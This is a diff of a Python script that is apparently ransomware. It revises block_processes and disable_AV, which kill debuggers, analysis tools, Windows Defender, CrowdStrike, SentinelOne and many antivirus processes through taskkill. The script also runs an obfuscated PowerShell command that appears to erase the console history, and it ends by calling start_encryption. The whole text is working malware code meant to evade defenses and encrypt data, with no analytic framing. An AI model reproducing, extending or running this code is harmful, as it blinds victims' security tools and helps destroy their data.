@@ -341,18 +341,14 @@ def block_processes():
         "powershell -ExecutionPolicy Bypass -EncodedCommand UgBlAG0AbwB2AGUALQBJAHQAZQBtACAALQBQAGEAdABoACAAIgAkAGUAbgB2ADoAVQBTAEUAUgBQAFIATwBGAEkATABFAFwAQQBwAHAARABhAHQAYQBcAFIAbwBhAG0AaQBuAGcAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABQAG8AdwBlAHIAUwBoAGUAbABsAFwAUABTAFIAZQBhAGQATABpAG4AZQBcAEMAbwBuAHMAbwBsAGUASABvAHMAdABfAGgAaQBzAHQAbwByAHkALgB0AHgAdAAiACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlAA=="
     )
     blocked_processes = [
-        "DbgX.Shell", "Dbgview", "ILSpy", "MpCmdRun", "MsMpEng", "ProcessHacker", "SbieCtrl",
-        "SbieSvc", "SecurityHealthSystray", "SentinelAgent", "SentinelHelperService", "SentinelUI", "WMIADAP", "autoruns",
-        "autorunsc", "burpsuit", "cain", "carbonblack", "cb", "cmd", "csfalcon",
-        "csfalconcontainer", "csfalconservice", "cyserver", "cytray", "decoder", "dnspy", "esensor",
-        "eventvwr", "fiddler", "filemon", "frida", "gdb", "gmer",
-        "hookexplorer", "httpanalyzerv7", "httpdebuggerui", "ida", "ida64", "idag", "idag64",
-        "idaq", "idaq64", "idaw", "idaw64", "immunitydebugger", "ksdumper", "mbam",
-        "mbamtray", "mbae", "mbaeservice", "msconfig", "netmon", "netstat", "ollydbg",
-        "perfmon", "powershell", "process", "processhacker", "procexp", "procexp64", "procmon",
-        "regedit", "regmon", "regripper", "sandboxie", "schtasks", "services", "smartscreen",
-        "sxutil", "sysmon", "tasklist", "taskmgr", "tcpview", "vboxservice", "wireshark",
-        "windasm", "windbg", "wmic", "x32dbg", "x64dbg",
+        "DbgX.Shell", "Dbgview", "ILSpy", "MpCmdRun", "MsMpEng", "ProcessHacker", "SbieCtrl", "SbieSvc", "SecurityHealthSystray", "SentinelAgent", "SentinelHelperService",
+        "SentinelUI", "WMIADAP", "autoruns", "autorunsc", "BurpSuite", "Cain", "CarbonBlack", "cb", "cmd", "CSFalcon",
+        "CSFalconContainer", "CSFalconService", "CyServer", "CyTray", "Decoder", "dnSpy", "eventvwr", "Fiddler", "frida-server", "gdb", "gmer",
+        "HookExplorer", "HttpAnalyzerV7", "HttpDebuggerUI", "ida", "ida64", "idag", "idag64", "idaq", "idaq64", "idaw",
+        "idaw64", "ImmunityDebugger", "ksdumper", "msconfig", "netmon", "netstat", "ollydbg", "perfmon", "powershell", "ProcessHacker",
+        "procexp", "procexp64", "procmon", "regedit", "regmon", "regripper", "Sandboxie", "schtasks", "services", "smartscreen",
+        "sxutil", "sysmon", "tasklist", "taskmgr", "tcpview", "VBoxService", "Wireshark", "Windasm", "windbg", "wmic", "x32dbg",
+        "x64dbg"
     ]
     for proc in blocked_processes:
         execute_command(f'taskkill /f /im "{proc + ".exe"}" /t')
@@ -557,7 +553,7 @@ def disable_AV():
         "pccpfw", "pccwin98", "persfw", "protector", "qconsole", "qdcsfs", "rtvscan", "sadblock", "safe", "sandboxieserver", "savscan", "sbiectrl", "sbiesvc", "sbserv", "scfservice", "sched", "schedm", "scheduler daemon", "sdhelp", "serv95", "sgbhp", "sgmain", "slee503",
         "smartfix", "smc", "snoopfreesvc", "snoopfreeui", "spbbcsvc", "sp_rsser", "spyblocker", "spybotsd", "spysweeper", "spysweeperui", "spywareguard.dll", "spywareterminatorshield", "ssu", "steganos5", "stinger", "swdoctor", "swupdate", "symlcsvc", "symundo", "symwsc", "symwscno", "tcguard", "tds2-98",
         "tds-3", "teatimer", "tgbbob", "tgbstarter", "tsatudt", "umxagent", "umxcfg", "umxfwhlp", "umxlu", "umxpol", "umxtray", "usrprmpt", "vetmsg9x", "vetmsg", "vptray", "vsaccess", "vsserv", "wcantispy", "win-bugsfix", "winpatrol", "wrsssdk", "xcommsvr", "xfr",
-        "xp-antispy", "zegarynka", "zlclient", "winpa'rolex",
+        "xp-antispy", "zegarynka", "zlclient", "winpa'rolex", "mbam.exe", "mbamtray.exe", "mbae.exe", "mbae-svc.exe",
     ]
     for proc in AV_processes:
         execute_command(
@@ -793,4 +789,5 @@ if __name__ == "__main__":
         shutdown()
     else:
         start_encryption()
+
 
